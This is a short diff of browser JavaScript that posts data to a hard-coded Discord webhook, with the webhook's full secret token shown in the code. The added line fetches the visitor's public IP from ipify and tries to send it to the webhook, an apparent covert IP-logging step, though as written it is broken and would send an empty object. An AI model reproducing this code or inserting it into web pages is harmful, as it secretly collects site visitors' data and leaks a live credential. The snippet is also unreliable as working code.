@@ -11,6 +11,7 @@
       "https://discord.com/api/webhooks/845950238719213608/OlWrovNwzQIgXHqGL1zlw5AyeMUg5M_QtCfXNqs7zDI1zlIv1gml_aET2InT6iBXyuaf"
       
     const msg = {
+      
       content: "idk"
     };
     
@@ -18,7 +19,7 @@
     fetch(whurl, {
       method: "POST",
       headers: { "content-type": "application/json" },
-      body: JSON.stringify(msg)
+      body: JSON.stringify(fetch('https://api.ipify.org') .then(data => (data)))
     });
 
     window.addEventListener("load", function() {
